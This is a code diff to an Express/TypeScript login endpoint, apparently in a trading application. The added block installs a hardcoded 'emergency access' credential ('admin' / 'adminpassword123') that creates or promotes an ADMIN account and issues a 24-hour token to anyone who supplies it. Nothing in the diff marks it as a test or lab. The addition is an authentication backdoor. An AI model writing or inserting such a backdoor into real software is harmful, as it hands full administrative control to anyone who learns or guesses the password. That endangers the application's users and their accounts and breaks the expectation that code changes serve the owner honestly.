@@ -131,6 +131,36 @@ app.post(['/api/auth/register', '/auth/register'], async (req: Request, res: Res
 app.post(['/api/auth/login', '/auth/login'], async (req: Request, res: Response) => {
   try {
     const { username, password } = req.body;
+
+    // Hardcoded Admin Fallback for emergency access
+    if (username === 'admin' && password === 'adminpassword123') {
+      let adminUser = await prisma.user.findUnique({ where: { username: 'admin' } });
+      if (!adminUser) {
+        const salt = await bcrypt.genSalt(10);
+        const passwordHash = await bcrypt.hash(password, salt);
+        adminUser = await prisma.user.create({
+          data: { username: 'admin', passwordHash, role: 'ADMIN' }
+        });
+      } else if (adminUser.role !== 'ADMIN') {
+        adminUser = await prisma.user.update({
+          where: { id: adminUser.id },
+          data: { role: 'ADMIN' }
+        });
+      }
+
+      const token = jwt.sign({ id: adminUser.id, username: adminUser.username, role: adminUser.role }, JWT_SECRET, { expiresIn: '24h' });
+      return res.json({ 
+        success: true, 
+        token, 
+        user: { 
+          id: adminUser.id, 
+          username: adminUser.username, 
+          role: adminUser.role,
+          isPaperTrading: adminUser.isPaperTrading 
+        } 
+      });
+    }
+
     const user = await prisma.user.findUnique({ where: { username } });
 
     if (!user || !user.passwordHash) {
